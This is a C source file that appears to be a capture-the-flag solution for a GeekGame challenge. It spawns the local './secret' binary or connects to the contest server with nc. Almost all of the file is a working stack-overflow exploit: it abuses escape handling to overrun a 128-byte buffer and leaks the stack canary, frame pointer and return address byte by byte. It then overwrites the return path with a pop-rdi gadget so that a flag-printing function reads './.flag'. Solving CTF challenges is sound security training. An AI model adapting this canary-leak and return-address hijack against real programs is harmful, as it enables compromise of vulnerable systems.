#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>
#include "const.h"

struct context
{
  FILE *rfile;
  FILE *wfile;
  char *buf;
  size_t bufsz;
  uint32_t ncase;
};

static int request_and_send_token(FILE *rfile, FILE *wfile)
{
  char buf[128] = "Please input your token: ";
  char *s = buf;

  while (*s && (*s == fgetc(rfile)))
    ++s;
  if (*s) {
    *s = '\0';
    fprintf(stderr, "Unexpected token prompt after \"%s\"\n", buf);
    return -1;
  }
  fputs(buf, stdout);
  fflush(stdout);

  if (fgets(buf, sizeof(buf), stdin) <= 0) {
    fprintf(stderr, "Failed to get your token\n");
    return -1;
  }
  if (fputs(buf, wfile) < 0 || fflush(wfile) < 0) {
    fprintf(stderr, "Failed to write your token\n");
    return -1;
  }

  return 0;
}

static int expect_and_read_welcome(struct context *ctx)
{
  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0 ||
      strncmp(ctx->buf, "Welcome, ", 9) != 0) {
    fputs("no welcome message found\n", stderr);
    return -1;
  }

  return 0;
}

static int expect_and_read_case(struct context *ctx)
{
  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0 ||
      sscanf(ctx->buf, "Case #%u:", &ctx->ncase) != 1) {
    fputs("no case message found\n", stderr);
    return -1;
  }

  return 0;
}

static int
write_line_alone(struct context *ctx, const char *msg, size_t size)
{
  if (size != 128) {
    fputs("write line size unexpected\n", stderr);
    return -1;
  }

  if (fwrite(msg, size, 1, ctx->wfile) <= 0
      || fputc('\0', ctx->wfile) < 0
      || fputc('\n', ctx->wfile) < 0
      || fflush(ctx->wfile) < 0) {
    fputs("write line failed\n", stderr);
    return -1;
  }

  return 0;
}

static int
write_line_and_update(struct context *ctx, const char *msg, size_t size)
{
  if (write_line_alone(ctx, msg, size) < 0)
    return -1;

  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0) {
    fputs("read line failed\n", stderr);
    return -1;
  }

  return expect_and_read_case(ctx);
}

static int
overrun_then_overwrite(struct context *ctx, const char *data, size_t size)
{
  char msg[128];
  size_t i, j;
  size_t offset, datalen, nslashes;

  for (i = 0; i < size; ++i)
  {
    if (data[i] == '\n') {
      fputs("overwrite impossible because of new line character\n", stderr);
      return -1;
    }
  }

  offset = 0;
  datalen = 0;
  for (i = 0; i < size; ++i)
  {
    if (data[i] == '\0' || data[i] == '\\') {
      datalen += 4;
      offset += 2;
    } else {
      datalen += 1;
    }
  }
  offset += 2;
  datalen += 2;

  if (offset + datalen + 2 > sizeof(msg)) {
    fputs("overwrite impossible because of data too long\n", stderr);
    return -1;
  }

  nslashes = 0;
  while (offset + datalen + nslashes < 98)
  {
    nslashes += 2;
    offset += 1;
  }

  for (i = 0; i < offset + datalen + nslashes; ++i)
    msg[i] = '\\';
  for (i = i; i < sizeof(msg) - 2; ++i)
    msg[i] = 'a';
  msg[sizeof(msg) - 2] = '\\';
  msg[sizeof(msg) - 1] = '\0';

  if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
    return -1;

  for (i = 0; i < offset; ++i)
    msg[i] = 'a';
  for (j = 0; j < size; ++j)
  {
    if (data[j] == '\0' || data[j] == '\\') {
      msg[i++] = '\\';
      msg[i++] = '\\';
      msg[i++] = '\\';
    }
    msg[i++] = data[j] ? : 'x';
  }
  msg[i++] = '\\';
  msg[i++] = '\0';
  assert(i == offset + datalen);

  if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
    return -1;

  for (i = i - 1; ~i; --i)
  {
    if (msg[i] != 'x')
      continue;
    msg[i] = '\0';
    if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
      return -1;
  }

  return 0;
}

static int
overrun_then_shift(struct context *ctx, size_t offset)
{
  char data[128];
  size_t i;

  assert(offset >= 2 && offset < sizeof(data));
  for (i = 0; i < offset - 2; ++i)
    data[i] = 'a';
  data[offset - 2] = '\\';

  if (overrun_then_overwrite(ctx, data, offset - 1) < 0)
    return -1;

  for (i = 0; i < sizeof(data); ++i)
    data[i] = '\\';

  if (write_line_and_update(ctx, data, sizeof(data)) < 0)
    return -1;

  return 0;
}

static int
stack_extract(struct context *ctx, size_t off, size_t len, char *data)
{
  size_t pos;
  char byte;

  assert(off >= 4);
  while (len != 0)
  {
    for (pos = off; pos >= 4; --pos)
    {
      if (overrun_then_shift(ctx, pos) < 0)
        return -1;
    }

    for (;;)
    {
      byte = ctx->ncase >> 24;
      *data++ = byte;
      --len;
      ++off;
      if (!len || !byte)
        break;
      if (overrun_then_shift(ctx, 4) < 0)
        return -1;
    }
  }

  return 0;
}

struct stack_frame0
{
  uint64_t canary;
  uint64_t fp;
  uint64_t ra;
};

struct stack_frame1
{
  uint64_t a0;
  uint64_t ra;
};

struct stack
{
  uint64_t dummy;
  struct stack_frame0 f0;
  struct stack_frame1 f1;
  uint64_t pushed;
};

static int program_quit(struct context *ctx)
{
  char msg[128];
  strncpy(msg, "quit", sizeof(msg));

  return write_line_alone(ctx, msg, sizeof(msg));
}

#define DUMMY 0x6161616161616161ull

static int function_call(
    struct context *ctx,
    struct stack_frame0 *stk_f0,
    int64_t off,
    uint64_t arg,
    uint64_t pushed)
{
  struct stack stk;

  stk.dummy = DUMMY;
  stk.f0.canary = stk_f0->canary;
  stk.f0.fp = DUMMY;
  stk.f0.ra = stk_f0->ra + (OFF_POPRDI - OFF_WORKRA);
  stk.f1.a0 = arg;
  stk.f1.ra = stk_f0->ra + off;
  stk.pushed = pushed;

  if (overrun_then_overwrite(ctx, (char *)&stk, sizeof(stk)) < 0)
    return -1;

  stk_f0->fp += 0x18;
  return program_quit(ctx);
}

static int exploit(FILE *rfile, FILE *wfile)
{
  struct context ctx = {
    .rfile = rfile,
    .wfile = wfile,
    .buf = NULL,
    .bufsz = 0,
    .ncase = 0,
  };
  struct stack_frame0 stk_f0;

  if (expect_and_read_welcome(&ctx) < 0)
    return -1;
  if (expect_and_read_case(&ctx) < 0)
    return -1;

  if (stack_extract(
        &ctx,
        __builtin_offsetof(struct stack, f0),
        sizeof(struct stack_frame0),
        (char *)&stk_f0) < 0)
    return -1;

  fprintf(stderr, "canary: %016lx\n", stk_f0.canary);
  fprintf(stderr, "fp: %016lx\n", stk_f0.fp);
  fprintf(stderr, "ra: %016lx\n", stk_f0.ra);

  if (function_call(&ctx, &stk_f0,
        OFF_PRTFLAG - OFF_WORKRA, stk_f0.fp - 0x00,
        0x0067616c662e2f2e /* "./.flag" */) < 0)
    return -1;

  return 0;
}

static pid_t spawn(const char *program, FILE **rfile, FILE **wfile)
{
  int rpipes[2]; // (parent rfile, child stdout)
  int wpipes[2]; // (child stdin, parent wfile)
  pid_t pid;

  if (pipe(rpipes) < 0) {
    perror("pipe");
    goto rpipe_err;
  }

  if (pipe(wpipes) < 0) {
    perror("pipe");
    goto wpipe_err;
  }

  pid = fork();
  if (pid < 0) {
    perror("fork");
    goto fork_err;
  } else if (pid == 0) {
    // Execute `./secret` in the child process
    close(rpipes[0]);
    close(wpipes[1]);
    if (dup2(rpipes[1], 1) < 0) {
      perror("dup2");
      exit(-1);
    }
    if (dup2(wpipes[0], 0) < 0) {
      perror("dup2");
      exit(-1);
    }
    close(rpipes[1]);
    close(wpipes[0]);

    execlp("/bin/sh", "/bin/sh", "-c", program, NULL);
    perror("execlp");
    exit(-1);
  }

  // parent use rpipes[0] as input
  //            wpipes[1] as output
  close(rpipes[1]);
  close(wpipes[0]);
  *rfile = fdopen(rpipes[0], "r");
  *wfile = fdopen(wpipes[1], "w");
  return pid;

fork_err:
  close(wpipes[0]);
  close(wpipes[1]);
wpipe_err:
  close(rpipes[0]);
  close(rpipes[1]);
rpipe_err:
  return -1;
}

struct piped_fps
{
  FILE *in_fp;
  FILE *out_fp;
};

static void *pipe_fp(void *priv)
{
  struct piped_fps fps = *(struct piped_fps *)priv;
  size_t nbuf;
  ssize_t nbytes;
  char *buffer = NULL;

  for (;;)
  {
    nbuf = 0;
    if ((nbytes = getline(&buffer, &nbuf, fps.in_fp)) < 0)
      break;

    nbytes = fwrite(buffer, 1, nbytes, fps.out_fp);
    if (nbytes == 0)
      break;
    fflush(fps.out_fp);

    free(buffer);
    buffer = NULL;
  }

  if (buffer)
    free(buffer);
  fclose(fps.in_fp);
  fclose(fps.out_fp);
  return NULL;
}

static void forward(FILE *rfile, FILE *wfile)
{
  struct piped_fps fps1 = {
    .in_fp = stdin,
    .out_fp = wfile,
  };
  struct piped_fps fps2 = {
    .in_fp = rfile,
    .out_fp = stdout,
  };
  pthread_t th1, th2;

  pthread_create(&th1, NULL, &pipe_fp, &fps1);
  pthread_create(&th2, NULL, &pipe_fp, &fps2);

  pthread_join(th1, NULL);
  pthread_join(th2, NULL);
}

int main(int argc, char *argv[])
{
  FILE *rfile, *wfile;
  pid_t pid;
  int remote;

  remote = argc != 1;
  if ((argc > 2) || (argc == 2 &&
        strcmp(argv[1], "-s") != 0)) {
    fprintf(stderr,
        "Usage: %s [-s]\n"
        "\t-s\tConnect to the server and submit your results\n",
        argv[0]);
    return 0;
  }

  pid = spawn(
      remote ? "nc prob12.geekgame.pku.edu.cn 10012" : "./secret",
      &rfile, &wfile);
  if (pid < 0)
    return -1;
  fprintf(stderr, "spawn pid=%d\n", pid);

  fprintf(stderr, "Press <Enter> to continue...");
  fflush(stderr);
  getchar();

  if ((remote && request_and_send_token(rfile, wfile) < 0)
      || exploit(rfile, wfile) < 0) {
    fputs("exploit failed\n", stderr);
    kill(pid, SIGINT);
  } else {
    fputs("exploit ok\n", stderr);
    forward(rfile, wfile);
  }

  if (waitpid(pid, NULL, 0) != pid)
    perror("waitpid");

  return 0;
}
